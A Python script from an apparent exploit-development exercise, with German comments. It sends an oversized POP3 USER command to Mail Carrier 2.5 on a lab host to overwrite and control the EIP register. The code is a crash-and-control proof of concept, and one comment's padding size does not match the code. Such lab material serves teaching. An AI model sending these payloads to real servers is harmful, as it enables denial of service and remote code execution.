# coding=utf-8
# -------------Mail Carrier 2.5 Buffer Overflow Exploit Uebung  -------------------------
# ---------------------------------------------------------------------------------------
# Entwickeln eines Buffer Overflow Exploits mit Remote Code Execution von Grund auf------
# ---------------------------------------------------------------------------------------
# Schritt 3a: Finden und Kontrollieren des EIP Registers---------------------------------
# ---------------------------------------------------------------------------------------

import socket, time

# Ip des Windows Clients
RHOST = "10.10.10.12"

# Gefundener Pattern Offset 5097
# Die nächsten vier gesendeten Bytes treffen dann EIP
# Wir senden 5097 As dann 4 Bs und dann am Ende noch 800 Cs
padding_start = "\x41" * 5097
EIP = "\x42" * 4
padding_end = "\x43" * 300


# Zusammensetzen der Payload
payload = padding_start + EIP + padding_end

print("[+] Sending Payload...")
# Verbindung zum Windows Client aufbauen
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((RHOST, 110))
# Empfang von Daten wenn der Server antwortet
print(connection.recv(1024))

# Senden der Zeichenkette
connection.send("USER " + payload + "\r\n")
# Emfang wenn der Username angenommen wird und Daten zurück gesendet werden. Zeigt uns dass der crash nicht funktioniert
print(connection.recv(1024))
# Geregeltes schliessen der Verbindung
connection.send("QUIT\r\n")
print(connection.recv(1024))
connection.close()
